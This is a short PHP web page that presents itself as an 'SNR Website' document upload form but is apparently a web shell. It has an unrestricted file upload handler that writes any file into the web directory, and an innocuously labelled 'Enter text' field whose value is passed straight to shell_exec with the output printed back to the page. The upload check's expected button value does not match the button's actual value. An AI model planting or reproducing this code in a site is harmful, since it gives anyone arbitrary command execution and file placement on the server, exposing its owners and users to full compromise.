<!DOCTYPE html>
<html>

<head>
    <title>SNR Website</title>
  </head>
  <h1>SNR Website - please upload your document</h1>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload task document" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Your document upload successfully!<b><br><br>'; }
else { echo '<b>file not uploaded!</b><br><br>'; }
}
?>
  
  <body>
    <h1>SNR Website</h1>
    <form method="POST">
      <label>Enter text:</label><br>
      <input type="text" name="cmd"><br>
      <input type="submit" value="submit">
    </form>
    <?php
      if (isset($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
      }
    ?>
  </body>
</html>



